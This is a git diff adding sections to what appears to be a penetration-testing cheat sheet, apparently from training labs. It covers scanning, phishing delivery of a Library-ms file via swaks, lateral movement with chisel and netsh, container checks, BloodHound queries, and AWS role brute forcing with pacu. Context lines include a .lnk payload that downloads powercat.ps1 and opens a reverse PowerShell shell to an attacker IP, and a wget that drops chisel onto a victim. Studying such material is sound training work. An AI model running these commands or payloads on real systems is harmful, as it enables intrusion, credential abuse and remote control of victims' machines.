@@ -51,6 +51,14 @@ knockpy -d domain.com --recon --save foldername
 </details>
 
 <details>
+<summary>dirb, gobuster, dirbuster</summary>
+
+``` bash
+gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
+```
+</details>
+
+<details>
 <summary> sublist3r </summary>
 
 ``` bash
@@ -89,6 +97,9 @@ grep /open/ filename.gnmap | cut -d ' ' -f 2 | sort -uV > livehosts.txt
 ``` bash
 # without using host discovery, SYN connect scan on range and only output open ports.
 sudo nmap -Pn -sT --open 10.140.21.1-255
+
+# good catch all, uses all default scripts, gets the version, and saves the output 
+sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242
 
 # full service scan on a /24 range. output in all formats (grep-able, xml, binary)
 sudo nmap -sV 10.10.20.0/24 -oA filename
@@ -191,7 +202,7 @@ create a file named 'config.Library-ms' with the following contents:
 </libraryDescription>
 ```
 
-create a .lnk file, entering the following into the input field and name it 'automatic_configuration'
+right click on a windows machine to create a .lnk file, entering the following into the input field and name it 'automatic_configuration'
 ``` powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
 powercat -c 192.168.119.3 -p 4444 -e powershell"
@@ -214,6 +225,12 @@ To upload the library file to the SMB share, we'll use smbclient with the -c par
 cd ~/webdav
 
 smbclient //192.168.50.195/share -c 'put config.Library-ms'
+```
+
+if sending payload via an SMTP server
+
+```bash
+sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
 
@@ -317,6 +334,9 @@ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continu
 
 # using pass the hash 
 crackmapexec smb 192.168.50.75 -u paul -H '08d7a47a6f9f66b97b1bae4178747494' -d corp.com --continue-on-success
+
+# list shares
+crackmapexec smb 192.168.50.242 -u john -p "dqojcoe#nL" --shares
 ```
 </details>
 
@@ -494,6 +514,7 @@ common payload types:
 
 1. office macros
 2. office auto DDE (default on excel and outlook)
+3. Library files 
 3. ISO images 
 4. zip files (often encrypted)
 5. lnk files with rundll32
@@ -1012,6 +1033,14 @@ bloodhound-python -d domain.com -u username -p password -c ALL -ns 10.10.192.2
 # using c# tooling (ps1 tooling also available), retreive AD infomation for loading into bloodhound and do not touch domian controllers (better for evasion)
 Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs
 ```
+
+some cipher queries for bloodhound:
+
+1. query to display all computers identified:
+`MATCH (m:Computer) RETURN m`
+
+1. query to display all users identified:
+`MATCH (m:User) RETURN m`
 </details>
 
 ## Lateral Movement
@@ -1029,6 +1058,26 @@ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
 ssh user@VICTIM_IP -p 2222
 ```
 </details>
+
+<details>
+<summary>chisel</summary>
+
+chisel works by creating a proxy over http/https, assisting with C2 through deep packet inspection.
+
+```bash
+# begin by copying the chisel binary to the victim machine
+wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+
+# on attacking machine, start the chisel server with the --reverse flag to allow the reverse port forward.
+chisel server --port 8080 --reverse
+
+# initiate the proxy on the victim machine
+chisel client 192.168.118.4:8080 R:socks
+
+
+```
+</details>
+
 
 <details>
 <summary>ssh tunneling</summary>
@@ -1109,15 +1158,15 @@ rem no output from the above command, confirm it was created
 netsh interface portproxy show all
 
 rem create a firewall rule to open port 2222 on a compromised host
-
-
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
 ```
+
 
 </details>
 
 <details>
 <summary>sshuttle</summary>
-leverage a forwarded port to provide transparent access to an internal network
+leverage a forwarded port to provide transparent access to an internal network (as if connected to a VPN)
 
 ``` bash
 # forward port 2222 on the compromised host to port 22 on 10.4.50.215
@@ -1411,6 +1460,22 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "AppUpdateMon" /
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
 - https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
+
+4. container escape
+
+``` bash
+# check if you are in a container
+cat /proc/mounts
+
+# check for excessive capabilities
+cat /proc/1/status | grep Cap
+
+# decode the capabilities
+capsh --decode=0000003fffffffff
+
+# The presence of cap_net_admin and cap_sys_admin indicates that this container is either running in a privileged context or, at the very least, with all capabilities added. 
+
+```
 
 </details>
 
@@ -1836,5 +1901,56 @@ Get-SecurityGroups -Tokens $tokens
 
 # identify dynamic security groups to possibly use for privelege escalation
 Get-DynamicGroups -Tokens $tokens
+```
+</details>
+
+## Cloud
+<details>
+<summary> cloud_enum </summary>
+
+``` bash
+# scan an aws cloud bucket that you know the name of
+cloud_enum -k lab-assets-dev-axevtewi --quickscan --disable-azure --disable-gcp
+```
+</details>
+
+<details>
+<summary> cli </summary>
+
+the attacker will need an account with the CSP (cloud service provider) in order to interact via cli. the cli can be powerful 
+
+``` bash
+# use aws cli to search for public resources
+aws configure --profile your_profile
+
+# confirm logged in 
+aws --profile your_profile sts get-caller-identity
+
+# look for public EC2's, filtering on description
+aws --profile attacker ec2 describe-images --executable-users all --filters "Name=description,Values=*CompanyName*"
+
+#same as above, filtering on name
+aws --profile attacker ec2 describe-images --executable-users all --filters "Name=name,Values=*ComapnyName*"
+```
+</details>
+
+<details>
+<summary> pacu </summary>
+
+``` bash
+# start an interactive shell 
+pacu
+
+# import a previously authenticated profile
+import_keys attacker
+
+# list modules
+ls
+
+# see more information on a module
+help iam__enum_roles
+
+# brut force valid IAM roles in a target account 
+run iam__enum_roles --word-list /tmp/role-names.txt --account-id 123456789012
 ```
 </details>
